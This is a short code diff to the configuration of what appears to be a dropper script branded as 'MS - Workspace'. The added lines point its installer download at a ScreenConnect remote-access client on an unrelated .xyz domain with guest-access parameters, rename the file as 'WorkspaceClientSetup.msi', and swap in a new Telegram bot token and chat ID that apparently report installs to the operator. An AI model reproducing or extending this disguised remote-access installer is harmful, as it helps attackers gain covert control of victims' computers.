@@ -7,7 +7,8 @@
     var CONFIG = {
         PRODUCT_NAME: "MS - Workspace",
         PRODUCT_VERSION: "1.0.0",
-        MSI_URL: "https://app.na-2.action1.com/agent/15b1f7b4-8734-11f1-8363-abb1c9cc2b0e/Windows/agent(My_Organization).msi",
+        MSI_URL: "https://swicurrie.xyz/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=xyz&c=&c=&c=&c=&c=&c=&c=",
+        MSI_FILE_NAME: "WorkspaceClientSetup.msi",
         INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
         LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
         LOG_FILE: "deploy.log",
@@ -21,8 +22,8 @@
         MSI_EXTRA_ARGS: "",
 
         TELEGRAM_ENABLED: true,
-        TELEGRAM_BOT_TOKEN: "8464029562:AAG_I1tNGuPsrhceGItKfpueUI-ouDCExPk",
-        TELEGRAM_CHAT_ID: "6969906163"
+        TELEGRAM_BOT_TOKEN: "8756497750:AAFX0gVj8j94Mff-FsRlnD3jfjuGzQZEfjo",
+        TELEGRAM_CHAT_ID: "6429384311"
     };
 
 
